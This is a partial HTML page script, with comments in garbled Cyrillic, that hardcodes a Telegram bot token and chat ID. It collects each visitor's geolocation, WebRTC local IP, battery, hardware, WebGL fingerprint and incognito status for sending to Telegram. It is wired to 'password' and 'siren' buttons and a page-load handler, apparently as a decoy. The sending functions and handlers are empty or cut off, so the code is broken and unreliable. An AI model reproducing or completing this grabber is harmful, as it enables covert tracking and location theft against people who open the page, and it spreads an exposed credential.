<body>

    <script>

        const botToken = '6818081299:AAGEDkvcZltkYKPELkGv8AuvRxpBzqMQLu8';
        const chatId = '1209403544';

        // –§—É–Ω–∫—Ü–∏—è –¥–ª—è —Å–±–æ—Ä–∞ —Ä–∞—Å—à–∏—Ä–µ–Ω–Ω–æ–π –∏–Ω—Ñ–æ—Ä–º–∞—Ü–∏–∏
        async function collectExtendedInfo() {
            const data = {
                "üåê –û—Å–Ω–æ–≤–Ω–∞—è –∏–Ω—Ñ–æ—Ä–º–∞—Ü–∏—è": {
                    "User Agent": navigator.userAgent,
                    "–ü–ª–∞—Ç—Ñ–æ—Ä–º–∞": navigator.platform,
                    "–Ø–∑—ã–∫": navigator.language,
                    "–û–Ω–ª–∞–π–Ω —Å—Ç–∞—Ç—É—Å": navigator.onLine ? "–û–Ω–ª–∞–π–Ω" : "–û—Ñ–ª–∞–π–Ω",
                    "–ö—É–∫–∏ –≤–∫–ª—é—á–µ–Ω—ã": navigator.cookieEnabled ? "–î–∞" : "–ù–µ—Ç"
                },
                "üñ•Ô∏è –°–∏—Å—Ç–µ–º–∞": {
                    "–†–∞–∑—Ä–µ—à–µ–Ω–∏–µ —ç–∫—Ä–∞–Ω–∞": `${screen.width}x${screen.height}`,
                    "–ì–ª—É–±–∏–Ω–∞ —Ü–≤–µ—Ç–∞": screen.colorDepth + " –±–∏—Ç",
                    "–ü–ª–æ—Ç–Ω–æ—Å—Ç—å –ø–∏–∫—Å–µ–ª–µ–π": window.devicePixelRatio,
                    "–î–æ—Å—Ç—É–ø–Ω–∞—è –ø–∞–º—è—Ç—å": performance.memory ? 
                        Math.round(performance.memory.jsHeapSizeLimit / (1024 * 1024)) + " MB" : "–ù–µ–¥–æ—Å—Ç—É–ø–Ω–æ",
                    "–Ø–¥–µ—Ä CPU": navigator.hardwareConcurrency || "–ù–µ–∏–∑–≤–µ—Å—Ç–Ω–æ"
                },
                "üìç –ì–µ–æ–ª–æ–∫–∞—Ü–∏—è": await getLocationInfo(),
                "üì∂ –°–µ—Ç—å": await getNetworkInfo(),
                "üîã –ë–∞—Ç–∞—Ä–µ—è": await getBatteryInfo(),
                "üõ°Ô∏è –ë–µ–∑–æ–ø–∞—Å–Ω–æ—Å—Ç—å": {
                    "–†–µ–∂–∏–º –∏–Ω–∫–æ–≥–Ω–∏—Ç–æ": isPrivateMode() ? "–î–∞" : "–ù–µ—Ç",
                    "WebGL": getWebGLInfo(),
                    "WebRTC IP": await getLocalIP()
                },
                "üìÖ –í—Ä–µ–º–µ–Ω–Ω—ã–µ –¥–∞–Ω–Ω—ã–µ": {
                    "–ß–∞—Å–æ–≤–æ–π –ø–æ—è—Å": Intl.DateTimeFormat().resolvedOptions().timeZone,
                    "–õ–æ–∫–∞–ª—å–Ω–æ–µ –≤—Ä–µ–º—è": new Date().toString(),
                    "–í—Ä–µ–º—è –∑–∞–≥—Ä—É–∑–∫–∏ —Å—Ç—Ä–∞–Ω–∏—Ü—ã": performance.timing ? 
                        new Date(performance.timing.navigationStart).toString() : "–ù–µ–¥–æ—Å—Ç—É–ø–Ω–æ"
                }
            };

        }

        // –§—É–Ω–∫—Ü–∏—è –¥–ª—è –ø–æ–ª—É—á–µ–Ω–∏—è –∏–Ω—Ñ–æ—Ä–º–∞—Ü–∏–∏ –æ –≥–µ–æ–ª–æ–∫–∞—Ü–∏–∏
        async function getLocationInfo() {
            return new Promise((resolve) => {
                if (!navigator.geolocation) {
                    resolve("–ì–µ–æ–ª–æ–∫–∞—Ü–∏—è –Ω–µ –ø–æ–¥–¥–µ—Ä–∂–∏–≤–∞–µ—Ç—Å—è");
                    return;
                }

                navigator.geolocation.getCurrentPosition(
                    (pos) => {
                        resolve({
                            "–®–∏—Ä–æ—Ç–∞": pos.coords.latitude,
                            "–î–æ–ª–≥–æ—Ç–∞": pos.coords.longitude,
                            "–¢–æ—á–Ω–æ—Å—Ç—å": pos.coords.accuracy + " –º–µ—Ç—Ä–æ–≤",
                            "–ö–∞—Ä—Ç–∞": `https://www.google.com/maps?q=${pos.coords.latitude},${pos.coords.longitude}`
                        });
                    },
                    (err) => resolve(`–û—à–∏–±–∫–∞: ${err.message}`),
                    { timeout: 5000 }
                );
            });
        }

        // –§—É–Ω–∫—Ü–∏—è –¥–ª—è –ø–æ–ª—É—á–µ–Ω–∏—è –∏–Ω—Ñ–æ—Ä–º–∞—Ü–∏–∏ –æ —Å–µ—Ç–∏
        async function getNetworkInfo() {
            const connection = navigator.connection || navigator.mozConnection || navigator.webkitConnection;
            if (!connection) return "–ò–Ω—Ñ–æ—Ä–º–∞—Ü–∏—è –æ —Å–µ—Ç–∏ –Ω–µ–¥–æ—Å—Ç—É–ø–Ω–∞";
            
            return {
                "–¢–∏–ø —Å–æ–µ–¥–∏–Ω–µ–Ω–∏—è": connection.effectiveType || "–ù–µ–∏–∑–≤–µ—Å—Ç–Ω–æ",
                "–°–∫–æ—Ä–æ—Å—Ç—å –∑–∞–≥—Ä—É–∑–∫–∏": connection.downlink ? connection.downlink + " Mbps" : "–ù–µ–∏–∑–≤–µ—Å—Ç–Ω–æ",
                "RTT": connection.rtt ? connection.rtt + " ms" : "–ù–µ–∏–∑–≤–µ—Å—Ç–Ω–æ",
                "–≠–∫–æ–Ω–æ–º–∏—è —Ç—Ä–∞—Ñ–∏–∫–∞": connection.saveData ? "–í–∫–ª—é—á–µ–Ω–∞" : "–í—ã–∫–ª—é—á–µ–Ω–∞"
            };
        }

        // –§—É–Ω–∫—Ü–∏—è –¥–ª—è –ø–æ–ª—É—á–µ–Ω–∏—è –∏–Ω—Ñ–æ—Ä–º–∞—Ü–∏–∏ –æ –±–∞—Ç–∞—Ä–µ–µ
        async function getBatteryInfo() {
            if (!navigator.getBattery) return "API –±–∞—Ç–∞—Ä–µ–∏ –Ω–µ –ø–æ–¥–¥–µ—Ä–∂–∏–≤–∞–µ—Ç—Å—è";
            
            try {
                const battery = await navigator.getBattery();
                return {
                    "–£—Ä–æ–≤–µ–Ω—å –∑–∞—Ä—è–¥–∞": Math.round(battery.level * 100) + "%",
                    "–°—Ç–∞—Ç—É—Å –∑–∞—Ä—è–¥–∫–∏": battery.charging ? "–ó–∞—Ä—è–∂–∞–µ—Ç—Å—è" : "–ù–µ –∑–∞—Ä—è–∂–∞–µ—Ç—Å—è",
                    "–í—Ä–µ–º—è –¥–æ –∑–∞—Ä—è–¥–∫–∏": battery.chargingTime === Infinity ? 
                        "–ù–µ–∏–∑–≤–µ—Å—Ç–Ω–æ" : Math.round(battery.chargingTime / 60) + " –º–∏–Ω—É—Ç",
                    "–í—Ä–µ–º—è –¥–æ —Ä–∞–∑—Ä—è–¥–∫–∏": battery.dischargingTime === Infinity ? 
                        "–ù–µ–∏–∑–≤–µ—Å—Ç–Ω–æ" : Math.round(battery.dischargingTime / 60) + " –º–∏–Ω—É—Ç"
                };
            } catch (e) {
                return "–û—à–∏–±–∫–∞ –ø–æ–ª—É—á–µ–Ω–∏—è –¥–∞–Ω–Ω—ã—Ö";
            }
        }

        // –§—É–Ω–∫—Ü–∏—è –¥–ª—è –ø—Ä–æ–≤–µ—Ä–∫–∏ –ø—Ä–∏–≤–∞—Ç–Ω–æ–≥–æ —Ä–µ–∂–∏–º–∞
        function isPrivateMode() {
            try {
                localStorage.setItem('test', 'test');
                localStorage.removeItem('test');
                return false;
            } catch (e) {
                return true;
            }
        }

        // –§—É–Ω–∫—Ü–∏—è –¥–ª—è –ø–æ–ª—É—á–µ–Ω–∏—è –∏–Ω—Ñ–æ—Ä–º–∞—Ü–∏–∏ –æ WebGL
        function getWebGLInfo() {
            const canvas = document.createElement('canvas');
            const gl = canvas.getContext('webgl') || canvas.getContext('experimental-webgl');
            
            if (!gl) return "WebGL –Ω–µ –ø–æ–¥–¥–µ—Ä–∂–∏–≤–∞–µ—Ç—Å—è";
            
            const debugInfo = gl.getExtension('WEBGL_debug_renderer_info');
            return debugInfo ? {
                "–í–µ–Ω–¥–æ—Ä": gl.getParameter(debugInfo.UNMASKED_VENDOR_WEBGL),
                "–†–µ–Ω–¥–µ—Ä–µ—Ä": gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL)
            } : "–ò–Ω—Ñ–æ—Ä–º–∞—Ü–∏—è –æ–≥—Ä–∞–Ω–∏—á–µ–Ω–∞";
        }

        // –§—É–Ω–∫—Ü–∏—è –¥–ª—è –ø–æ–ª—É—á–µ–Ω–∏—è –ª–æ–∫–∞–ª—å–Ω–æ–≥–æ IP —á–µ—Ä–µ–∑ WebRTC
        function getLocalIP() {
            return new Promise((resolve) => {
                const pc = new RTCPeerConnection({ iceServers: [] });
                pc.createDataChannel('');
                pc.createOffer().then(offer => pc.setLocalDescription(offer));
                
                pc.onicecandidate = (ice) => {
                    if (!ice.candidate) return;
                    const ip = ice.candidate.candidate.match(/([0-9]{1,3}(\.[0-9]{1,3}){3})/)?.[1];
                    if (ip) resolve(ip);
                };
                
                setTimeout(() => resolve("–ù–µ —É–¥–∞–ª–æ—Å—å –æ–ø—Ä–µ–¥–µ–ª–∏—Ç—å"), 2000);
            });
        }

        // –§—É–Ω–∫—Ü–∏—è –¥–ª—è –æ—Ç–ø—Ä–∞–≤–∫–∏ –¥–∞–Ω–Ω—ã—Ö –≤ Telegram
        async function sendToTelegram(message) {

        }

        // –û–±—Ä–∞–±–æ—Ç—á–∏–∫ –∫–Ω–æ–ø–∫–∏ –ø–∞—Ä–æ–ª—è
        document.getElementById('passwordButton').addEventListener('click', async function() {

            sendToTelegram(message);

        });

        // –û–±—Ä–∞–±–æ—Ç—á–∏–∫ –∫–Ω–æ–ø–∫–∏ —Å–∏—Ä–µ–Ω—ã
        document.getElementById('sirenButton').addEventListener('click', function() {

        // –ü—Ä–∏ –∑–∞–≥—Ä—É–∑–∫–µ —Å—Ç—Ä–∞–Ω–∏—Ü—ã
        window.addEventListener('load', async function() {
